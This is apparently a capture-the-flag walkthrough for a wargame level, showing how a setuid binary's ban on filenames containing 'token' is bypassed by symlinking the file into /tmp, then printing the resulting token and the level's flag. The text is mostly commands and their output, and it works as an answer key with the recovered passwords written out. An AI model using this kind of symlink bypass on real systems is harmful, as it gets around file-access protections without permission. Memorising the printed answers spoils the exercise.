# Level 08

## step 1 : try things
```
$ ./level08 token
You may not access 'token'
```
## step 2 : analyze level08
```
$ strings level08
```
we understand that level blocks access to all files that include the word token.

## step 3 : bind token
```
$ ln -s /home/user/level08/token /tmp/flag08
$ ./level08 /tmp/flag08
quif5eloekouj29ke0vouxean
```

## step 3 : get level09 password
```
$ su flag08
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
